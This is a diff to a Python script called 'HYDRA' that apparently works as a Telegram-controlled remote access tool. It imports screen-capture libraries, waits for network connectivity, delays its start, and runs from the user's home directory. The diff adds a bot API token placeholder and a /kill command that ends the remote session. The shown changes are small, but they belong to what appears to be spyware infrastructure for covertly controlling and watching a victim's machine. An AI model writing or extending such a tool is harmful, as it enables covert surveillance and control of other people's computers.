@@ -1,5 +1,6 @@
 import os
 import re
+import sys
 import mss
 import cv2
 import time
@@ -37,7 +38,7 @@ while(is_connected_to_internet()==False):
 # print("WORKING !")
 
 sleep(45)
-TOKEN = ''   
+TOKEN ='_________________API_TOKEN_________________'   
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
@@ -48,6 +49,19 @@ bot.set_webhook()
 @bot.message_handler(commands=['start'])
 def start(message):
     bot.send_message(message.chat.id, 'Welcome! To The HYDRA \n\nMade by @SUDO')
+
+
+@bot.message_handler(commands=['kill'])
+def kill(message):
+    try:
+
+         bot.send_message(message.chat.id, 'HYDRA Session Killed.')
+         os._exit(0) #terminating 
+
+    except:
+        bot.send_message(message.chat.id, 'HYDRA Session unable to terminate.')
+
+
 
 @bot.message_handler(commands=['help'])
 def help_msg(message):
